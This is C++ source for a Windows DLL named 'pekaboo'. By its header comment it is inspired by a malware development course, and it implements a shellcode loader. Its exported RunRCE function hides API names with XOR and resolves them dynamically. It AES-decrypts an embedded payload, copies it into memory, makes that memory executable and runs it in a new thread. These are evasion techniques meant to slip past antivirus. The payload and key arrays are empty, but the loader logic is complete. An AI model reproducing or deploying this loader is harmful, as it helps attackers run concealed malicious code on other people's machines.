/*
pekaboo.cpp - inspired by RTO malware development course implementation
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

unsigned char my_payload[] = { };
unsigned char s_va[] = { };
unsigned char s_vp[] = { };
unsigned char s_ct[] = { };
unsigned char s_wfso[] = { };

unsigned int my_payload_len = sizeof(my_payload);
unsigned int s_va_len = sizeof(s_va);
unsigned int s_vp_len = sizeof(s_vp);
unsigned int s_ct_len = sizeof(s_ct);
unsigned int s_wfso_len = sizeof(s_wfso);

char my_payload_key[] = { };
char f_key[] = "";

LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
            return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
            return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
            return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
            return -1;
    }    
    if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
            return -1;
    }
    
    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
    
    return 0;
}

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j;
    
    j = 0;
    for (int i = 0; i < data_len; i++) {
            if (j == key_len - 1) j = 0;

            data[i] = data[i] ^ key[j];
            j++;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI RunRCE(void) {
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // decrypt XOR VirtualAlloc
    XOR((char *) s_va, s_va_len, f_key, sizeof(f_key));
    pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), s_va);

    // Allocate memory for payload
    exec_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt payload
    AESDecrypt((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
    
    // Copy payload to allocated buffer
    RtlMoveMemory(exec_mem, my_payload, my_payload_len);

    // decrypt XOR VirtualProtect
    XOR((char *) s_vp, s_vp_len, f_key, sizeof(f_key));
    pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), s_vp);

    rv = pVirtualProtect(exec_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);

    // If all good, launch the payload
    if ( rv != 0 ) {

        // XOR decrypt CreateThread
        XOR((char *) s_ct, s_ct_len, f_key, sizeof(f_key));
        pCreateThread = GetProcAddress(GetModuleHandle("kernel32.dll"), s_ct);
        th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
        
        // XOR decrypt WaitForSingleObject
        XOR((char *) s_wfso, s_wfso_len, f_key, sizeof(f_key));
        pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wfso);
        pWaitForSingleObject(th, -1);
    }
    return TRUE;
    }
}
